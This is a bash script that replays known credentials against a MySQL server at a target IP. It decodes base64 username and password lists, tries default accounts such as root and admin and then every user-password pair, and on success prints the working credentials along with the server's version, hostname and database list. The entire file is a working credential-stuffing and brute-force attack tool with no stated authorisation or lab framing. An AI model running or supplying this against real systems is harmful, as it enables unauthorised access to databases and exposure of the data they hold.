#!/bin/bash
# Replay known credentials against MySQL service
# Usage: mysql_replay_pairs.sh <TARGET_IP> <known_users_b64> <known_passwords_b64>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"
KNOWN_USERS_B64="${2:-}"
KNOWN_PASSES_B64="${3:-}"

echo "=== MySQL replay ==="

USERS=$(echo "$KNOWN_USERS_B64" | base64 -d 2>/dev/null) || USERS=""
PASSES=$(echo "$KNOWN_PASSES_B64" | base64 -d 2>/dev/null) || PASSES=""

try_mysql() {
    local u="$1" p="$2"
    local r
    r=$(mysql -h "$TARGET_IP" -P 3306 -u "$u" -p"$p" --connect-timeout=5 \
        -e "select user(), version(), @@hostname; show databases;" 2>&1) || true
    if echo "$r" | grep -qE "Database|@@hostname"; then
        echo "MYSQL_LOGIN_OK:$u:$p"
        echo "$r" | head -50
        return 0
    fi
    return 1
}

# MySQL default root account first
for u in root admin mysql; do
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_mysql "$u" "$p" && exit 0
    done <<< "$PASSES"
done

# User Cartesian product
while IFS= read -r u; do
    [ -z "$u" ] && continue
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_mysql "$u" "$p" && exit 0
    done <<< "$PASSES"
done <<< "$USERS"

echo "MYSQL_REPLAY_FAILED"
